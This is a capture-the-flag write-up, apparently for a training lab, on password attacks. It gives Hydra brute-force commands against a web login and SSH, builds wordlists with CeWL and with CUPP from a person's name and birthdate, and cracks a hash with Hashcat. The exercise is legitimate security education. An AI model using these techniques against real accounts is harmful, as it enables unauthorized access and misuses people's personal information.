# Checkmate CTF

A multi-stage password security challenge focused on weak credentials, OSINT, custom wordlists, and password reuse patterns.

## Task 1 - Firewall Login Brute Force

The target application was hosted on a virtual host at `firewall.thm:5001`.

First, I configured local host mapping:

```bash
sudo nano /etc/hosts
```

Added:

```text
10.146.141.99 firewall.thm
```

After visiting the site, I found a login page. Default credentials failed, so I inspected the login request in the browser developer tools and identified:

* POST authentication
* `/login` endpoint
* Parameters:

  * `username`
  * `password`

I used Hydra to brute force the login:

```bash
hydra -l admin -P rockyou.txt -f -V -t4 -s 5001 firewall.thm \
http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials."
```

Credentials discovered:

```text
admin:12345
```

## Task 2 - Company Keyword Passwords

The next application was hosted on:

```text
jobs.thm:5002
```

Added to `/etc/hosts`:

```text
10.146.141.99 jobs.thm
```

While browsing the previous site, I noticed recurring company keywords such as:

* security
* excellence

Testing these manually revealed a valid password:

```text
Marco:excellence
```

I later learned this could also be automated with CeWL, which generates custom wordlists from website content:

```bash
cewl -d 2 -m 6 --lowercase -w keywords.txt http://jobs.thm:5002
```

This wordlist could then be used with Hydra for targeted password attacks.

## Task 3 - OSINT-Based Wordlist Generation

This level introduced personalized password attacks using publicly available information.

I used CUPP (Common User Passwords Profiler) to generate a custom wordlist:

```bash
git clone https://github.com/Mebus/cupp.git
cd cupp
python3 cupp.py -i
```

Using gathered information:

* First name: Marco
* Last name: Bianchi
* Nickname: marky
* Birthdate: 14021995

CUPP generated a tailored password list, which I reused with Hydra.

Discovered password:

```text
Bianchi2495
```

## Task 4 - SHA256 Filename Hash Cracking

Marco’s profile image used a SHA256 hash of the original filename.

After inspecting the page source, I extracted the hash and cracked it using a custom Python script I previously built for hash cracking practice.

This could also be solved using Hashcat:

```bash
hashcat -m 1400 hash.txt rockyou.txt
```

Recovered filename:

```text
family
```

## Task 5 - Password Pattern Reuse

Marco mentioned a password strategy involving:

* company keywords
* capitalization
* years
* special characters

I combined:

* company keywords from Task 2
* personal information from Task 3

Then regenerated a custom wordlist with CUPP and used Hydra against SSH:

```bash
hydra -l Marco -P marco.txt -f -V -t4 <target_ip> ssh
```

Recovered SSH credentials:

```text
Marco:Security2024!
```

## Key Takeaways

* Weak password policies remain extremely common
* OSINT can dramatically improve password attacks
* Custom wordlists are often more effective than generic brute forcing
* Password reuse and predictable formatting create major security risks
* Virtual host routing requires proper `/etc/hosts` configuration during testing
